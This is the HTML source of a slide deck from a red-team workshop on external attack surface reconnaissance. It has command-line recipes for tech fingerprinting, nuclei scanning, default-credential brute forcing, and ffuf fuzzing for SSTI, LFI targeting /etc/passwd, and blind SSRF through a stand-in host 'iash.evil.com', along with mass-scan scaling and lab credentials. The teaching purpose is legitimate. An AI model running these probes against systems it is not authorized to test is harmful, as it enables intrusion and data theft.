<!doctype html>
<html lang="en">

	<head>
		<meta charset="utf-8">

		<title>EASM 🤿</title>

		<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">

		<meta name="viewport" content="width=device-width, initial-scale=1.0">

		<link rel="stylesheet" href="dist/reset.css">
		<link rel="stylesheet" href="dist/reveal.css">
		<link rel="stylesheet" href="dist/theme/black.css" id="theme">
		<link rel="stylesheet" href="dist/custom.css">

		<!-- Theme used for syntax highlighting of code -->
		<link rel="stylesheet" href="plugin/highlight/monokai.css">
	</head>

	<body>

		<div class="reveal">

			<!-- Any section element inside of this container is displayed as a slide -->
			<div class="slides">
				<section>
					<h1>EASM - A deep 🤿 </h1>
					<h4>https://camp-easm-deep.github.io</h4>
				</section>
				<section>
					<h1>WHOAMI</h1>
					<h3>SIX2DEZ</h3>
					<img src="profile_pic.jpg" style="border-radius:50%;width:20%;"/>
					<ul>
						<li style="font-size: 0.7em;">Dad, ethical hacker and bash lover at <img style="vertical-align: middle;width: 4em;margin: 0px;" data-src="visma_logo.png">  Red Team</li>
						<li style="font-size: 0.7em;">Main FOSS projects: <a href="https://github.com/six2dez/reconftw">reconFTW</a>, <a href="https://github.com/six2dez/OneListForAll">OneListForAll</a>, <a href="https://pentestbook.six2dez.com/">pentest-book</a></li>
						<li style="font-size: 0.7em;">Into climbing, hiking and anything related to mountains</li>
						<li style="font-size: 0.7em;"><a href="https://twitter.com/six2dez1">@six2dez1</a> on Twiter, <a href="https://github.com/six2dez">@six2dez</a> almost everywhere else</li>
					</ul>
					</br>

				</section>
				<section>
					<h1>WHOAMI</h1>
					<h3>joohoi</h3>
          			<img src="joohoi_profile.jpg" style="border-radius:50%;width: 20%;" /><br />
					<ul>
						<li>Handwaver at <img style="vertical-align: middle;width: 4em;margin: 0px;" data-src="visma_logo.png"> red team</li>
						<li>Open source stuff: <strong>acme-dns</strong>, <strong>ffuf</strong>, <strong>certbot</strong></li>
						<li>Dad, board game geek, brewer</li>
						<li><a href="https://twitter.com/joohoi">@joohoi</a> everywhere on the inter{webs,tubes,pipes}</li>
					</ul>
					</br>
        		</section>
				<section>
					<section>
					<h2>This workshop</h2>
					<ul>
						<li>Tools of the trade to dig deeper</li>
						<li>What's interesting and what's not</li>
						<li>Dabbling into vulnerability scanning</li>
					</ul>
					</br></br>
					</section>
					<section>
						<h2>Setup</h2>
						<p>Get the domain list for the labs:<br /> <a href="https://gist.githubusercontent.com/six2dez/3e11b938e61eb436ea54e54a6c361b2f/raw">https://gist.githubusercontent.com/six2dez/3e11b938e61eb436ea54e54a6c361b2f/raw</a></p>
					<p>Credentials: root / camp23Recon</p>
					</section>

				</section>
				<section>
					<h2>Technology inspection</h2>
					<section>
						<p>
							<img src="https://media.giphy.com/media/1uyFaGpt2ilmE/giphy-downsized-large.gif" width="auto" height="auto"/>
						</p>
					</section>
					<section>
						<h4>
							Software versions
						</h4>
						<ul>
							<li style="font-size: 0.7em;">Useful for further steps
								<ul>
									<li style="font-size: 0.8em;">Targeted attacks</li>
									<li style="font-size: 0.8em;">Known vulns</li>
								</ul>
							</li>
							<li style="font-size: 0.7em;">Helps to prioritize</li>
							<li style="font-size: 0.7em;">Level of patching</li>
						</ul>
					</section>
					<section>
						<h4>
							Banner grabbing / custom services
						</h4>
						<ul>
							<li style="font-size: 0.7em;">Same as software versions</li>
							<li style="font-size: 0.7em;">OS Fingerprinting</li>
							<li style="font-size: 0.7em;">Custom/unknown services == interesting</li>
						</ul>
					</section>
					<section>
						<h4>Banner grabbing for non-HTTP services</h4>
						<pre data-id="code-animation" class="bash"><code>nmap -sV --script=banner target.ip</code></pre>
						<h4>OS Detection</h4>
						<pre data-id="code-animation" class="bash"><code>nmap -O target.ip</code></pre>
						<ul>
							<li style="font-size: 0.7em;">--osscan-limit to only output results for "ideal" targets</li>
							<li style="font-size: 0.7em;">--osscan-guess to go opportunistic</li>
						</ul>
					</section>
					<section>
						<h4>HTTP services</h4>
						<p>More dimensions than just the IP address and port:</p>
						<ul>
							<li>SNI routing for TLS connections</li>
							<li>Virtual hosts</li>
							<li>Reverse proxy rules based on paths</li>
						</ul>
						<p>Because of this, it's important to recurse and iterate</p>
					</section>
					<section>
						<h4>
							Tech detection for HTTP services
						</h4>
						<p style="font-size: 0.7em;">History of known vulnerabilities on different CMSs (WordPress, Drupal), Frameworks (Symfony, Laravel) and common bypasses depending on the WAF</p>
						<pre data-id="code-animation" class="bash"><code>
			# Web tech detection
			httpx -title -server -tech-detect -cdn -l list.txt
			
			# CMS detection
			python3 cmseek.py -l target_list.txt
			
			# WAF detection
			wafw00f -l target_list.txt
						</code></pre>
					</section>
					<section>
						<h4>
							Visual inspection / web screenshooting
						</h4>
						<p style="font-size: 0.7em;">Helps to filter thousand of screenshots and most of the tools provide report</p>
						<p style="font-size: 0.7em;">We can take advantage of AI to classify sites according to appearance</p>
						<pre data-id="code-animation" class="bash"><code>
			# Web screenshoting
			gowitness file -f sites.txt	

			# Classify based on given pretrained AI model
			python3 eyeballer.py --weights model.h5 evaluate /path/
						</code></pre>
					</section>
				</section>
				<section>
					<h2>Gathering the low hanging fruit</h2>
					<section>
						<br>
						<br>
						<p>
							<img src="https://media.giphy.com/media/0r51Zmo72WICswWagi/giphy.gif" width="auto" height="auto"/>
						</p>
					</section>
					<section>
						<h4>
							CVE's and known weaknesses
						</h4>
						<ul>
							<li style="font-size: 0.7em;">CVE Trends</li>
							<li style="font-size: 0.7em;">Default credentials</li>
							<li style="font-size: 0.7em;">Easy box HTB-like typical vulns</li>
						</ul>
					</section>
					<section>
						<br>
						<br>
						<br>
						<h4>
							Nuclei
						</h4>
						<ul>
							<li style="font-size: 0.7em;">FOSS replacement for vulnerability scanners</li>
							<li style="font-size: 0.7em;">Templates based</li>
							<li style="font-size: 0.7em;">Community driven templates</li>
							<li style="font-size: 0.7em;">From tech detection to critical exploits</li>
							<li style="font-size: 0.7em;">Easy to start writing your own templates</li>
						</ul>
					</section>
					<section>
						<br>
						<br>
						<br>
						<h4>
							Nuclei
						</h4>
						<pre data-id="code-animation"><code>
						# Fetch latest templates
						nuclei -ut						
						
						# Scan horizontally for specific CVE
						cat targets.txt | nuclei -id CVE-2023-1337

						# Scan for default credentials (or other tag)
						cat targets.txt |nuclei -tags default-login

						# Automatic scan with built-in tech detection 
						# to tag mapping
						cat targets.txt |nuclei -as
						</code></pre>
					</section>
					<section>
						<h4>
							Common sensitive files
						</h4>
						<ul>
							<li style="font-size: 0.7em;">Credentials disclosure</li>
							<li style="font-size: 0.7em;">Sensitive internal information</li>
							<li style="font-size: 0.7em;">Other assets critical info</li>
							<li style="font-size: 0.7em;"><a href="https://github.com/six2dez/OneListForAll/blob/main/onelistforallmicro.txt">Juicy files</a>: .conf,.env,.sftp_config,etc</li>
							<li style="font-size: 0.7em;">PII</li>
						</ul>
					</section>
					<section>
						<br>
						<h4>
							Subdomain takeovers
						</h4>
						<p>Misconfigured DNS record pointing to a 3rd party service that can be claimed by anyone.
						<ul>
							<li style="font-size: 0.7em;">Forgotten company assets</li>
							<li style="font-size: 0.7em;">Mainly hidden subdomains on deep levels</li>
							<li style="font-size: 0.7em;">Impact on brand reputation and users data</li>
							<li style="font-size: 0.7em;">Most of times requires paid subscription</li>
							<li style="font-size: 0.7em;"><a href="https://github.com/projectdiscovery/nuclei-templates/tree/main/takeovers">Nuclei templates FTW</a></li>
							<li style="font-size: 0.7em;">Fix: Take care of your DNS records, periodic cleanup</li>
						</ul>
					</section>
				</section>
				<section>
					<h2>Bringing out the guns</h2>
					<section>
						<p>
							<img src="https://media.giphy.com/media/e2Qlt1gyZmFAbOhly4/giphy.gif" width="auto" height="auto"/>
						</p>
					</section>
					<section>
						<h4>
							Login bruteforcing/default credentials
						</h4>
						<p>Pre-configured technology based attack templates will take you far here.
						Project Discovery's nuclei has a large template library for default credentials at your disposal.
						Nuclei templates are pretty straightforward to create on your own in case you want to test a large
						amount of instances of a specific application.</p>

						<p>Other options include having credential pair wordlists at hand and running them through ffuf. This
						will require a bit more contextual knowledge (like when creating a nuclei template) and isn't
						as easily globally automated.</p>
					</section>
					<section>
						<h3>
							Url collectors: Crawling
						</h3>
						<h4>Katana</h4>
						<p style="font-size: 0.7em;">A web crawler that spits out links found in the site. Has an extensive amount of configuration
						options to make sure you don't spin out of scope, has abilities to include authentication cookies
						or other headers, using a headless browser instead of "dumb" html parsing...
						</p>
						<pre><code>katana -list url_list.txt -jc -kf -ef jpg,png</code></pre>
					</section>
					<section>
						<br>
						<h3>
							Url collectors: Passive / history
						</h3>
						<h4>gau / waymore / github-endpoints</h4>
						<p style="font-size: 0.7em;">Extract urls given the domain from different third-party services, such as WaybackMachine, VirusTotal or URLScan. Sometimes it is more useful than crawlers/spiders because they can contain GET parameters and give us an idea of how it is used, they can even reveal sensitive information.</p>
						<pre><code>
		# gau
		cat sites.txt | gau
		# waymore
		python3 waymore.py -i webs.txt -mode U -f -O file.txt
		# github-endpoints
		github-endpoints -d target.tld -t key.txt -o output.txt
						</code></pre>
					</section>
					<section>
						<h4>
							Url analysis (<a href="https://github.com/1ndianl33t/Gf-Patterns">gf patterns</a>)
						</h4>
						<p>Grep wrapper written Go for url classification and finding potentially vulnerable patterns with regexes</p>
						<ul>
							<li style="font-size: 0.7em;">SSRF</li>
							<li style="font-size: 0.7em;">SQLi</li>
							<li style="font-size: 0.7em;">base64</li>
							<li style="font-size: 0.7em;">Extension detection</li>
						</ul>
					</section>
					<section>
						<h4>
							Contextual wordlists: target based
						</h4>
						<p>You can utilize tools like tomnomnom's <a href="https://github.com/tomnomnom/unfurl">unfurl</a>
						to extract juicy parts of the crawled urls to create basis for a custom wordlist. Typically interesting things include parameter keys, values, paths etc.</p>

						<pre class="bash" data-id="code-animation"><code># GET parameter keys
cat url_list.txt | unfurl keys | tee keys.txt</code></pre>

						<p>There are some old and trusty tools like <a href="https://github.com/digininja/CeWL">CeWL</a> for target based wordlist generation from everything
						on the site.</p>
					</section>
					<section>
						<h4>
							Contextual wordlists: technology based
						</h4>
						<p>OneListForAll has a great collection of <a href="https://github.com/six2dez/OneListForAll/tree/main/dict">wordlists separated by technologies</a>.</p>
						<p>Assetnote <a href="https://wordlists.assetnote.io/">hosts a collection</a> of specifically crafted,
						context based wordlists for anyone to use.</p>
					</section>
					<section>
						<h4>
							Specific vulnerability scanners
						</h4>
						<p>Tools built around a specific technology focused on different concrete vulnerabilities around it</p>
						<ul>
							<li style="font-size: 0.7em;">WPScan</li>
							<li style="font-size: 0.7em;">CMSeek</li>
							<li style="font-size: 0.7em;">aem-hacker</li>
							<li style="font-size: 0.7em;">sret</li>
						</ul>
					</section>
					<section>
						<h4>
							JS analysis
						</h4>
						<p>There is still much room for improvement here, as JS parsing and rendering is difficult to automate</p>
						<ul>
							<li style="font-size: 0.7em;"><a href="https://github.com/w9w/JSA">Recursive</a> JS <a href="https://github.com/xnl-h4ck3r/xnLinkFinder">search</a></li>
							<li style="font-size: 0.7em;">Endpoints collector</li>
							<li style="font-size: 0.7em;"><a href="https://github.com/projectdiscovery/nuclei-templates/tree/main/exposures">Secrets on JS</a></li>
						</ul>
					</section>
					<section>
						<h3>Responders: interactsh</h3>
						<p>This is available as a hosted solution, but you get a lot more out of it when hosting your own instead,
						and especially when talking about potential vulnerabilities, it's important that you own your data!</p>
						<p><a href="https://github.com/projectdiscovery/interactsh">https://github.com/projectdiscovery/interactsh</a></p>
						<p>In order to set one up, you will need a server (VPS) with a static IP address, and a domain name.</p>
						<p>In context of web application testing, it's most often used just as DNS responder to catch SSRF requests.</p>
					</section>
					<section>
						<h3>Responders: XSSHunter</h3>
						<p>Here's a great tool for efficient management of XSS vulnerabilities, especially blind XSS. The OG XSSHunter
						was sundowned just recently and has been succeeded by a slightly modified fork hosted by Trufflesec.</p>
						<p>To underline "you should really host your own" - stance and data ownership, there has been some 
							controversy with Trufflesec for farming the hosted XSSHunter database, allegedly for statistics.</p>
						<p>OG: <a href="https://github.com/mandatoryprogrammer/xsshunter-express">https://github.com/mandatoryprogrammer/xsshunter-express</a></p>
						<p>Trufflesec fork: <a href="https://github.com/trufflesecurity/xsshunter">https://github.com/trufflesecurity/xsshunter</a></p>
					</section>
					<section>
						<h4>
							Advanced web fuzzing
						</h4>
						<p>A great tool for this purpose is ffuf. It is designed to be very versatile, a swiss army knife type of a web fuzzer.</p>
						<img src="ffuf_logo.png" style="width: 40%;margin: -30px;">
						<p>There are couple of examples of automated scans you can do with ffuf, but it does allow you to do much more.
						For more in-depth walkthrough of the different options available, visit <a href="https://github.com/ffuf/ffuf/wiki">ffuf documentation</a>.</p>

					</section>
					<section>
						<h4>Advanced web fuzzing: Credential scraping</h4>
						<p>Ffuf provides a way to add something called <a href="https://github.com/ffuf/ffuf/wiki/Scraper">scraper rules</a>. These are json files can be placed in $HOME/.config/ffuf/scraper/</p>
						<p>These rules are passively applied to all ffuf scans if you save the file in the global scrapers directory. For one-shot usage, you can just reference a scraper file with -scraperfile cli parameter.</p>
						<pre data-id="code-animation"><code># mc 999 will disable all output unless a scraper rule is hit
ffuf -w all_urls.txt -u FUZZ -mc 999 \
	   -scraperfile aws_creds.json</code></pre>
					</section>
					<section>
						<h4>
							Advanced web fuzzing: Virtualhosts
						</h4>
						<p>Try all the hostnames against all the web hosts, and report all the vhosts getting answered by
						specific edge servers / load balancers. This can yield some sweet misconfiguration cases.</p>
						<pre data-id="code-animation"><code>ffuf -w hostnames.txt:VHOST -w hostnames.txt:DOMAIN \
				-u https://DOMAIN -H "Host: VHOST" -ac -ach
						</code></pre>
					</section>
					<section>
						<h4>
							Advanced web fuzzing: Headers (blind)
						</h4>
						<p>You can utilize a list of all well-known header keys to fish for different vulnerabilities.
						Go crazy by including them all in to a single request, or try to be more specific and pick out the exact culprit.</p>
						<p>XSS (via administrative consoles usually), misconfigured reverse proxies, load balancers and so on.</p>
						<p>You should have individual ffuf runs for each type that you may need specific matcher / filter in ffuf. For example:
						timing based filtering for time-based SQLi</p>
						<pre data-id="code-animation"><code>ffuf -w headernames.txt:HEADERNAME -w payloads.txt:PAYLOAD \
				-w hostnames.txt:TARGET \
				-u https://TARGET \
				-H "HEADERNAME: PAYLOAD"</code></pre>
					</section>
					<section>
						<h4>
							Advanced web fuzzing: SSTI
						</h4>
						<p>Create your own wordlist out of simple-to-fingerprint SSTI payloads. A good resource to start would be
						<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">PayloadsAllTheThings</a>
							SSTI page.</p>
						<p>Make sure the calculation yields something unique for you that is easy to match against. The typical {{7*7}} might yield a lot
						of false positives ;)</p>
						<pre data-id="code-animation"><code>ffuf -w ssti_payloads.txt:SSTI -w get_params.txt:GETPARAM \
				-w hostnames.txt:TARGET \
				-u https://TARGET/?GETPARAM=SSTI \
				-mr 'result_of_your_unique_calculation_here'</code></pre>
					</section>
					<section>
						<h4>
							Advanced web fuzzing: LFI
						</h4>
						<p>You can follow the same principle as with SSTI payloads. This time around you however want to have either multiple ffuf runs
						with individual matchers in case you are trying to read different well-known files from the filesystem.
							</p>
						<p>You can use the
							<a href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt">LFI wordlist</a>
						by Jhaddix, distributed in SecLists for inspiration.</p>
						<p>This example uses LFI wordlist for different techniques trying to read /etc/passwd</p>
						<pre data-id="code-animation"><code>ffuf -w lfi_payloads.txt:LFI -w get_params.txt:GETPARAM \
				-w hostnames.txt:TARGET \
				-u https://TARGET/?GETPARAM=LFI \
				-mr 'root:x:0:0:root'</code></pre>
					</section>
					<section>
						<h4>
							Blind SSRF payloads
						</h4>
						<p>ffuf 2.0 has a reverse-mapping feature called <b>FFUFHASH</b> that allows you to add a unique token
							to blind SSRF payloads. This works especially well with interactsh. In this oversimplified example we expect
						you interactsh domain to be <b>iash.evil.com</b>:</p>
						<pre data-id="code-animation"><code>ffuf -w params.txt -u \
		https://target.tld/?FUZZ=%2F%2FFFUFHASH.iash.evil.com</code></pre>
						<p>To get the raw request after a hit:</p>
						<pre data-id="code-animation"><code>ffuf -search 129fhna</code></pre>	
					</section>
				</section>
				<section>
					<h2>Scaling</h2>
					<section>
						<img src="https://media.giphy.com/media/6bh9FTTEKdtZe/giphy.gif" />
					</section>
					<section>
						<img src="axiom_banner.png" style="width: 50%;"/>
						<ul>
                            <li>The tool splits wordlists and other input methods between the instances in the fleet</li>
							<li>Results are recovered and stitched back together on the control machine</li>
							<li><a href="https://github.com/pry0cc/axiom">https://github.com/pry0cc/axiom</a></li>
                        </ul>
					</section>
					<section>
						<h4>Axiom</h4>
						<pre><code>
							# Building the image
							axiom-build

							# Spin up the fleet
							axiom-fleet "1337squadron" -i 50

							# Scanning
							axiom-scan input.txt -m ffuf -o output.txt

							# Deleting the fleet
							axiom-rm -f "\*"
						</code></pre>
						<p style="font-size: 0.7em;">⚠️ High DDOS risk</p>
					</section>
					<section>
						<img src="serverless.jpeg" style="width: 30%"/>
						<ul>
                            <li>Scales infinitely, but can get pricy</li>
							<li>Spawn thousands of worker functions to cover the surface extremely fast</li>
							<li><a href="https://github.com/fyoorer/ShadowClone">https://github.com/fyoorer/ShadowClone</a></li>
                        </ul>
					</section>
					<section>
						<h4>Shadowclone</h4>
						<ul>
                            <li>Set up: <a href="https://github.com/fyoorer/ShadowClone/wiki">https://github.com/fyoorer/ShadowClone/wiki</a></li>
							<li>Note: the AWS policy you create needs to also have the "iam:PassRole"</li>
							<li>Wiki a bit outdated but the following should work:</li>
                        </ul>
						<pre><code># build your container
lithops runtime build sc-runtime -f Dockerfile

# deploy it with 512Mb memory and 300sec timeout
lithops runtime deploy --memory 512 --timeout 300 sc-runtime</code></pre>
						<p>What to expect:</p>
						<ul>
                            <li style="font-size: 0.7em;">1m 40s to nuclei scan 700k websites against a single template</a></li>
							<li style="font-size: 0.7em;">10m to map technologies for 700k websites</a></li>
						</ul>
					</section>
				</section>
				<section>
					<h2>Questions?</h2>
				</section>
				<section>
					<h2>Thanks!</h2>
				</section>
			</div>
		</div>
		<script src="dist/reveal.js"></script>
		<script src="plugin/zoom/zoom.js"></script>
		<script src="plugin/notes/notes.js"></script>
		<script src="plugin/search/search.js"></script>
		<script src="plugin/markdown/markdown.js"></script>
		<script src="plugin/highlight/highlight.js"></script>
		<script>

			// Also available as an ES module, see:
			// https://revealjs.com/initialization/
			Reveal.initialize({
				controls: true,
				progress: true,
				center: true,
				hash: true,

				// Learn about plugins: https://revealjs.com/plugins/
				plugins: [ RevealZoom, RevealNotes, RevealSearch, RevealMarkdown, RevealHighlight ]
			});

		</script>

	</body>
</html>
